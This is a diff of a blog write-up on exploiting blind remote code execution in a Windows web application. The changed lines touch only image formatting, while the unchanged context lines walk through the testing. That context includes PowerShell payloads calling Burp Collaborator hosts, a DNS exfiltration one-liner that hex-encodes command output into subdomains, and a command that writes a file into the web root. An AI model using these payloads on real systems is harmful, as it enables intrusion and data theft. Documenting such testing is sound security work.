@@ -5,8 +5,8 @@ I was following the PoC given [here](http://www.0xby.com/1589.html).
 
 I was getting the following page while accessing the application.
 
-![image1](1.1.png){: .align-center}
-image 1.1
+![image1](1.1.png)
+
 
 There were RCE available payloads for windows and linux. The following payload was used to trigger the RCE for windows.
 
@@ -52,8 +52,8 @@ powershell -exec bypass -c "sleep 60;wget 'kuiudtisadndwxklxi7g9c6rwi28qx.burpco
 
 And I did get a hit exactly after 65 seconds, which confirms that the system is running on windows and we indeed have blind RCE.
 
-![image1](1.2.png){: .align-center}
-image 1.2
+![image1](1.2.png)
+
 
 Looking at the above picture, we can see that something is trying to resolve our request, but the actual request is getting blocked. There was also one more thing I noticed. If I try the same url again, I would not get a DNS hit as the DNS request is probably getting cached.
 
@@ -65,8 +65,8 @@ So we have the following
 2. The application cannot initiate communication with any system outside. So all kinds of callbacks are out of question.
 3. We get DNS hits for the URL we send to the system.
 
-![image1](1.3.png){: .align-center}
-image 1.3
+![image1](1.3.png)
+
 
 Our application infra probably looks something like the above picture.
 
@@ -74,8 +74,8 @@ After some research, I came upon this awesome technique called DNS exfiltration.
 
 > Actually, this is not new technical, according to the Akamai, this technique is about 20 years old. In a simple definition, DNS Data exfiltration is way to exchange data between 2 computers without any directly connection, the data is exchanged through DNS protocol on intermediate DNS servers.
 
-![image1](1.4.png){: .align-center}
-image 1.4 
+![image1](1.4.png)
+
 
 To exfiltarate data via DNS
 1. Setup a domain and point the name server to one we control. This can be archived using burp collaborator or buying a domain and settings its name server to a server we control.
@@ -90,8 +90,7 @@ The payload will be
 powershell -exec bypass -c "wget 'dnstest.9u4y5mpcus6j3r0wtquruty7yy4osd.burpcollaborator.net'"
 ```
 
-![image1](1.5.png){: .align-center}
-image 1.5
+![image1](1.5.png)
 
 Awesome. We can see that our data was indeed appended as part of the DNS request. We can use this to append the output of our command outputs as part of the subdomain and we will be able to receive the output of the command. We can also read files using this technique. 
 
@@ -125,13 +124,12 @@ Now time to try out the payload.
 powershell -exec -c "$(whoami) -split '(.{16})' | ? {$_} | % { Resolve-DnsName (([System.BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($_))).Replace('-','')+'.gk4q3p8o09d9mtahnexcz8wnmes8gx.burpcollaborator.net') -Type A; Start-Sleep -Seconds 1 }"
 ```
 
-![image1](1.6.png){: .align-center}
-image 1.6
+![image1](1.6.png)
 
 And we get two hits with some hex data.
 
-![image1](1.7.png){: .align-center}
-image 1.7
+![image1](1.7.png)
+
 
 Decoding it with burp decode shows us the output. And surprisingly the application is running as  `nt authority\system` which is a dangerous thing to do.
 
@@ -155,8 +153,7 @@ powershell -exec bypass -c "echo 'file created as part of security testing' > se
 
 And we can visit the page to view our payload.
 
-![image1](1.8.png){: .align-center}
-image 1.8 
+![image1](1.8.png)
 
 And we can see our text. Unfortunately I do not have permission to  upload a shell. So this will be it. 
 
